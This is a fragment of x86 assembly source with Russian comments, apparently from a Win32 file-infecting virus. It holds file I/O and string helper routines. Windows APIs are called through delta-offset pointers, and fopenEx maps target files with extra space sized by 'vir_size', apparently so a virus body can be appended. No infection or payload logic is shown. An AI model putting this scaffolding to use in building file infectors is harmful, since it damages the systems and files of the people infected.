access_ecx              equ     (dword ptr 24)
access_eax              equ     (dword ptr 28)

fcheckerror:            mov     eax,[sGetLastError+ebp]
                        call    eax
                        or      eax, eax
                        jz      __1  ; CF=0
                        mov     [esp].access_eax+4, 0   ; zero EAX in POPA
                        stc
__1:                    ret

fopen:                  pusha
                        ;;
                        push    0
                        push    FILE_ATTRIBUTE_NORMAL
                        push    OPEN_EXISTING
                        push    0
                        push    FILE_SHARE_READ
                        push    GENERIC_READ + GENERIC_WRITE
                        push    edx
                        mov     eax,[sCreateFileA+ebp]
                        call    eax
                        or      eax,eax
                        jnz     __1
                        stc
__1:
                        mov     [esp].access_eax, eax
;GetLastError в этом случае почему то возвращает ошибку 07eh .
;                       call    fcheckerror

                        popa
                        ret

IFDEF                   ALL_FIO

fcreate:                pusha
                        ;;
                        push    0
                        push    FILE_ATTRIBUTE_NORMAL
                        push    CREATE_ALWAYS
                        push    0
                        push    FILE_SHARE_READ
                        push    GENERIC_READ + GENERIC_WRITE
                        push    edx
                        mov     eax,[sCreateFileA+ebp]
                        call    eax
                        ;;
                        mov     [esp].access_eax, eax
                        call    fcheckerror
                        popa
                        ret

ENDIF

fclose:                 pusha
                        ;;
                        push    ebx
                        mov     eax,[sCloseHandle+ebp]
                        call    eax
                        ;;
                        call    fcheckerror
                        popa
                        ret

IFDEF                   ALL_FIO

fread:                  pusha
                        ;;
                        push    0
                        lea     eax, [esp].access_eax + 4
                        push    eax               ; bytesread
                        push    ecx
                        push    edx
                        push    ebx
                        mov     eax,[sReadFile+ebp]
                        call    eax
                        ;;
                        call    fcheckerror
                        popa
                        ret

fwrite:                 pusha
                        ;;
                        push    0
                        lea     eax, [esp].access_eax + 4
                        push    eax               ; byteswritten
                        push    ecx
                        push    edx
                        push    ebx
                        mov     eax,[sWriteFile+ebp]
                        call    eax

                        ;;
                        call    fcheckerror
                        popa
                        ret

ENDIF
─────────────────────────────────────────────────────────────────[_FIO.INC]───
───────────────────────────────────────────────────────────────[_FIOEX.INC]───
MAX_MAP_SIZE            equ     10*1048576
;MAX_MAP_SIZE            equ      0
; fopenEx  (EDX=fname,
;           EDI=address)     : CF=1  EAX=errorcode   CF=0 EAX=mapping base
;                                                         EBX=file handle
;                                                         ECX=file size
; fcloseEx (EAX=mapping base,
;           EBX=file handle,
;           ECX=file size)   : CF=1  EAX=errorcode   CF=0

FILE_BEGIN              equ     0
PAGE_READWRITE          equ     000000004h
FILE_MAP_ALL_ACCESS     equ     0000F001Fh

fopenEx:                pusha

                        call    fopen
                        jc      __error

                        mov     [esp].access_ebx, eax

                        push    0
                        push    eax
                        mov     eax,[sGetFileSize+ebp]
                        call    eax
                        mov     [esp].access_ecx, eax
                        add     eax,vir_size*30
                        push    0
                        push    eax
;                       push    MAX_MAP_SIZE
                        push    0
                        push    PAGE_READWRITE
                        push    0
                        push    [esp].access_ebx + 4*5
                        mov     eax,[sCreateFileMappingA+ebp]
                        call    eax
                        mov     [filemaphandle+ebp],eax

                        mov     [esp].access_eax, eax

                        call    fcheckerror
                        jc      __exit

                        push    0       ; file size, 0=map entire file
                        push    0       ; offs-lo
                        push    0       ; offs-hi
                        push    FILE_MAP_ALL_ACCESS
                        push    [esp].access_eax + 4*4
                        mov     eax,[sMapViewOfFile+ebp]
                        call    eax


                        mov     [esp].access_eax, eax

                        call    fcheckerror

__exit:                 popa
                        ret

__error:                mov     [esp].access_eax, eax

                        popa
                        ret

fcloseEx:               pusha

                        push    eax
                        mov     eax,[sUnmapViewOfFile+ebp]
                        call    eax

                        call    fcheckerror
                        jc      __exit

                        push    FILE_BEGIN
                        push    0
                        push    [esp].access_ecx + 4*2
                        push    [esp].access_ebx + 4*3
                        mov     eax,[sSetFilePointer+ebp]
                        call    eax

                        push    [esp].access_ebx
                        mov     eax,[sSetEndOfFile+ebp]
                        call    eax

                        mov     ebx,[filemaphandle+ebp]
                        call    fclose

                        mov     ebx, [esp].access_ebx
                        call    fclose

                        jnc     __exit
__error:                mov     [esp].access_eax, eax

__exit:                 popa
                        ret
───────────────────────────────────────────────────────────────[_FIOEX.INC]───
──────────────────────────────────────────────────────────────[STRINGS.ASM]───
;-----------------------------------------------------------
; StrCompare Сравнить две строки
;-----------------------------------------------------------
; Вход:
;       si = адрес строки 1 (s1)
;       di = адрес строки 2 (s2)
; Выход:
;       набор флагов для условных переходов jb, jbe,
;       je, ja, jae, or
; Регистры:
;       не используются
;-----------------------------------------------------------
StrCompare     PROC

        push    eax
        push    edi
        push    esi

        cld
@@10:
        lodsb
        scasb
        jne     @@20
        or      al, al
        jne     @@10
@@20:
        pop     esi
        pop     edi
        pop     eax
        ret
ENDP StrCompare
;-----------------------------------------------------------
; StrPos Найти вхождение в строку подстроки
;-----------------------------------------------------------
; Вход:
;       si = адрес искомой подстроки
;       di = адрес проверяемой целевой строки
; Выход:
;       Если zf = 1, тогда dx = индекс подстроки
;       Если zf = 0, тогда подстрока не найдена
; Замечание: если zf = 0, то значение в dx не имеет никакого смысла
; Регистры:
;       dx
;-----------------------------------------------------------
ASCNull EQU     0
StrPos    PROC
        push    eax
        push    ebx
        push    ecx
        push    edi

        call    StrLength
        mov     eax, ecx
        xchg    esi, edi
        call    StrLength
        mov     ebx, ecx
        xchg    esi, edi
        sub     eax,ebx
        jb      __20
        mov     edx, 0FFFFFFFFh
__10:
        inc     edx
        mov     cl, byte ptr [ebx + edi]
        mov   byte ptr  [ ebx + edi], ASCNull
        call    StrCompare
        mov   byte ptr [ebx + edi], cl
        je      __20
        inc     edi
        cmp     edx, eax
        jne     __10
        xor     ecx, ecx
        inc     ecx
__20:
        pop     edi
        pop     ecx
        pop     ebx
        pop     eax
        ret
ENDP    StrPos

;-----------------------------------------------------------
; StrLength Подсчитать в строке количество ненулевых символов
;-----------------------------------------------------------
; Вход:
;       di = адрес строки (s)
; Выход:
;       cx = количество ненулевых символов в s
; Регистры:
;       cx
;-----------------------------------------------------------
StrLength PROC
        push    eax
        push    edi

        xor     al, al
        mov     ecx, 0FFFFFFFFh
        cld
        repnz   scasb
        not     ecx
        dec     ecx

        pop     edi
        pop     eax
        ret
ENDP StrLength
──────────────────────────────────────────────────────────────[STRINGS.ASM]───
